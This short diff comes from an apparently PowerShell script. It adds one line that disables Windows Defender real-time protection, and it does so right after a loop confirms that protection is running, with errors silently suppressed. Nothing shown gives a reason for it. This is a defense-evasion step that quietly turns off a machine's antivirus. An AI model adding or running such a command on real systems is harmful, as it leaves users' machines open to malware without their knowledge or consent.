@@ -22,6 +22,8 @@ for ($i = 0; $i -lt $maxAttempts; $i++) {
         $defenderService = Get-Service -Name WinDefend -ErrorAction Stop
         $mpStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue
         if ($defenderService.Status -eq 'Running' -and $mpStatus.RealTimeProtectionEnabled -eq $true) {
+            # Disable Windows Defender Real-Time Protection
+            Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
             break
         }
     } catch {
